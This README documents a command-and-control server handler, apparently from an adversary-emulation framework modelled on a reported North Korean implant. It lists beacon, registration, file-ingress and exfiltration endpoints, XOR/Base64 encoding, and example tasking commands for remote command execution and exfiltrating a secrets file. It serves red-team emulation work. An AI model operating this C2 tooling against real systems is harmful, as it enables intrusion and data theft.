# FULLHOUSE.DOORED HTTP Handler

The FULLHOUSE.DOORED HTTP Handler functions as the server-side counterpart to the FULLHOUSE.DOORED implant, and communicates with it over HTTP. The handler is configured to do the following:

- respond to implant beacons / task requests with a task command
- register a new implant with the control server, or indicate that a session already exists for the implant
- process the task response data and upload to the control server
- accept tasking from `evalsC2client.py` and send to implants when requested

## Components

The handler consists of an HTTP web server that listens on a specified address/port, and serves the following URL endpoints:

| URL Endpoint | Server Response | Description |
| ------------ | --------------- |------------ |
| `GET /request/{identifier}` | Heartbeat response, Implant task | Heartbeat request / task request |
| `POST /request/{identifier}` | Heartbeat response | Initial implant registration and discovery data |
| `POST /form/{identifier}` | Heartbeat response | Task response from implant |
| `GET /files/{filename}` | Contents of specified file | File ingress request from implant |
| `POST /submit` | Heartbeat response | File exfiltration from implant, the filename is included in the HTTP header |

The first packet from the FULLHOUSE.DOORED implant will contain the hostname, username, process ID, and its UUID. The implant will set a random sleep value (between 5-15 seconds) after it registers.

## Encryption

All communication to/from the FULLHOUSE.DOORED implant will be Base64 encoded and XOR'd. The entire JSON packet will be encoded.

## Usage

### Building

To build the control server binary, run the following command from the `evalsC2server` directory:

```
go build -o controlServer main.go
```

### Configuration

To enable and configure the FULLHOUSE.DOORED HTTP handler within the control server, provide a `fullhouse` entry in your handler configuration YAML file (see example below). Adjust the host and port values as necessary.

Example:

```
fullhouse:
  host: 10.0.2.11
  port: 8080
  enabled: true
```

Run the `controlServer` binary as `sudo` and monitor the output to see FULLHOUSE handler updates. Ex:

```
sudo ./controlServer -c ./config/your_handler_config.yml
```

### Testing

Unit tests for the FULLHOUSE.DOORED HTTP handler are available in the `fullhouse_test.go` file. To run these tests, run the following command from the `evalsC2server` directory:

```
sudo go test ./...
```

To run only a single test, navigate to the `evalsC2server\handlers\fullhouse` directory and run:

```
sudo go test -run NameOfTestFunction
```

### Tasking

To submit a task to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields:

| Field | Data Type | Necessity | Description |
| ------------ | ----------- | ----------- |----------- |
| id | int | required | The ID of the task the implant will execute. A table detailing the different tasks is available below. |
| arg | string | optional | Command line arguments for the implant to execute OR paths for file upload/download.  |
| payload | string | optional | The name of the server-side payload to deliver as part of the task. |

The following table contains the various acceptable commands and their meanings:

| Command      | Arguments | Implant Output | Description |
| -----------  | --------- | -------------- | ------------|
| 0 | None | None | Heartbeat (no task available) |
| 1 | CLI arguments | Process output of CLI args | Command execution |
| 2 | Payload/file name and path | None | File ingress (C2 -> Implant) |
| 3 | File path | None | File exfiltration (Implant -> C2) |

Use the following format to submit the commands from the `evalsC2server` directory:

```
./evalsC2client.py --set-task <UUID> '{"id": <id>, "payload": "<payload name>", "arg": "<args>"}'
```

Example commands:

- 1: Task command execution of `whoami`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id": 1, "arg":"whoami"}'
  ```

- 2: Task file download of `myPayload`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id": 2, "payload": "myPayload", "arg":"/path/to/write/myPayload"}'
  ```

- 3: Task file upload of `secrets.txt`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id": 3, "arg":"/path/to/secrets.txt"}'
  ```

### Troubleshooting

## CTI References

1. <https://www.mandiant.com/resources/blog/north-korea-supply-chain>
2. <https://objective-see.org/blog/blog_0x77.html>
